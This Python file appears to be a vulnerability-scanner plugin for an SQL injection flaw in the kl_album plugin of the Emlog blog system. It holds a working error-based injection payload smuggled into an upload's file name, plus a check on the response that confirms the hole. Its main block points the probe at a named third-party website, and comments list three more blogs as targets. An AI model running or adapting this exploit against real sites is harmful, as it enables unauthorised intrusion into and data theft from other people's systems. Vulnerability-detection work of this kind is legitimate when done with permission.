#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Haihai
#_PlugName_ = Emlog相册插件SQL注入漏洞
#__Refer___ = http://www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html
import re
def assign(service, arg):
    if service == 'emlog':
        return True, arg
def audit(arg):
    payload = 'content/plugins/kl_album/kl_album_ajax_do.php'
    target = arg + payload
    raw="""POST /content/plugins/kl_album/kl_album_ajax_do.php HTTP/1.1
Host: www.zhangjiexiong.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Forwarded-For: 8.8.8.8
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=---------------------------19397961610256
Content-Length: 514

-----------------------------19397961610256
Content-Disposition: form-data; name="Filedata"; filename="info',(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,md5(1)))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a),'','','0','0','', 0)#.jpg"
Content-Type: image/jpeg

1
-----------------------------19397961610256
Content-Disposition: form-data; name="album"

111111
-----------------------------19397961610256--"""
    code, head, res, errcode, _ = curl.curl2(target, raw=raw)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('emlog', 'http://www.zhangjiexiong.com/my/')[1])
    # audit(assign('Emlog', 'http://blog.hzmhw.net/')[1])
    # audit(assign('Emlog', 'http://blog.chenziwen.com/')[1])
    # audit(assign('Emlog', 'http://blog.itxueke.com/')[1])